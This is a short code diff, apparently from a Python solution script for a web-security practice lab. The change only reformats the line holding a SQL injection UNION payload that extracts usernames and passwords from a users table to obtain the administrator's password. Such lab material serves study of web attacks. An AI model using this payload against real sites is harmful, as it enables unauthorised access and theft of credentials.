@@ -15,7 +15,8 @@ proxies = {
 def get_exploit_administrator_password(url):
     username = 'administrator'
     path = '/filter?category=Gifts'
-    sql_payload = "' UNION select username, password from users--"
+    sql_payload = (
+        "' UNION select username, password from users--")
     response = requests.get(
         url + path + sql_payload,
         verify=False,
